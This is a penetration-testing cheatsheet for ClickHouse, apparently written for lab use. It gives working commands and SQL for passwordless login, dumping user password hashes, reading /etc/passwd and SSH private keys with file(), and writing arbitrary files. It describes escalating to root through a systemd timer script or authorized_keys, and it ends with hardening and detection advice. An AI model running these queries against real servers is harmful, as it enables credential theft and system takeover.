---
topic: clickhouse
tags: [database, clickhouse, ssrf, file-write]
---

# ClickHouse — cheatsheet

**English** | [🇪🇸 Español](cheatsheet.md)

> Columnar analytics database. In labs it usually sits behind a vhost on 8123 (HTTP) / 9000 (native).

## Access

```bash
# HTTP (most common, even through nginx)
curl -s 'http://<HOST>:8123/?query=SELECT%20version()'
curl -s 'http://<HOST>:8123/?query=SELECT%20version()' --user 'default:'
curl -s 'http://<HOST>:8123/' --data-binary 'SELECT version() FORMAT TSV'

# CLI
clickhouse-client --host <HOST> --port 9000 --user default --password ''
clickhouse-client --host <HOST> --query "SHOW DATABASES"

# Web UI
# http://<HOST>:8123/play
```

Default accounts worth trying: `default` with no password, or whatever a heap dump / `.env` reveals.

## Enumeration

```sql
SELECT version();
SHOW DATABASES;
SHOW TABLES FROM <db>;
SHOW CREATE TABLE <db>.<table>;
SELECT * FROM system.users;              -- users and hashes
SELECT name, value FROM system.settings WHERE name LIKE '%file%';
```

```bash
curl -s 'http://<HOST>:8123/' --data-binary 'SELECT * FROM <db>.<t> FORMAT TSVWithNames'
```

`system.users` stores `name`, `auth_type` and the hash (SHA256 in modern versions) — useful when passwords are reused.

## Reading files

```sql
SELECT * FROM file('/etc/passwd', 'LineAsString');
SELECT * FROM file('/home/<user>/.ssh/id_rsa', 'LineAsString');
```

Other formats read binaries raw; `url()`, `s3()`, `mysql()` and `postgresql()` provide SSRF and lateral movement.

## Writing files (it runs as the service user)

```sql
INSERT INTO TABLE FUNCTION file('/tmp/pwned.txt', 'LineAsString', 'line String') VALUES ('hola');
SELECT 'content' INTO OUTFILE '/tmp/out.txt';
```

If the server runs as root, this is arbitrary write **as root**. The classic pattern: overwrite a script that a `systemd` timer executes as root, or drop a key into `authorized_keys`.

## Persistence and cleanup

```sql
DROP TABLE IF EXISTS <db>.<t>;
TRUNCATE TABLE <db>.<t>;
```

Always restore what you touched: in a lab, cleanup is part of the job.

## Hardening

- No passwordless `default`; per-application users with ACLs (`GRANT SELECT ON db.* TO app`).
- No `FILE`, `S3`, `URL`, `REMOTE` privileges for application accounts.
- 8123/9000 bound to localhost or the internal network, never exposed to the Internet.
- `readonly=1` for read-only accounts.

## Detection

- `file(`, `url(`, `INTO OUTFILE` in the query log.
- New files in system paths owned by the service user.
- HTTP requests to 8123 from unexpected hosts.

## References

- <https://clickhouse.com/docs/en/sql-reference/table-functions/file>
- <https://clickhouse.com/docs/en/operations/system-tables/users>
- <https://clickhouse.com/docs/en/operations/access-rights>
